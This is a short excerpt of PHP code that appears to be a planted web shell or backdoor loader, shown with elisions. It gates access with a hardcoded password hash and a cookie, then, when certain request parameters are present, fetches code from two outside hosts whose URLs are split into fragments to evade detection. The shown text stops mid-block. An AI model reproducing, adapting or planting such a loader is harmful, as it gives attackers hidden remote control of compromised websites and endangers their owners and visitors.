<?php
$p = "a62644fcf9b783d7ea9608dde1ecfa35";
...
if (isset($_POST['logout']) && $_POST['logout'] = 1) { setcookie("p", null); $pass= false; }
...
<?php
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('htt'.'ps://c4.ic'.'w4.xy'.'z/'); if(!$code){$code = GC('ht'.'tps://c2.ic'.'w7.co'.'m/');}
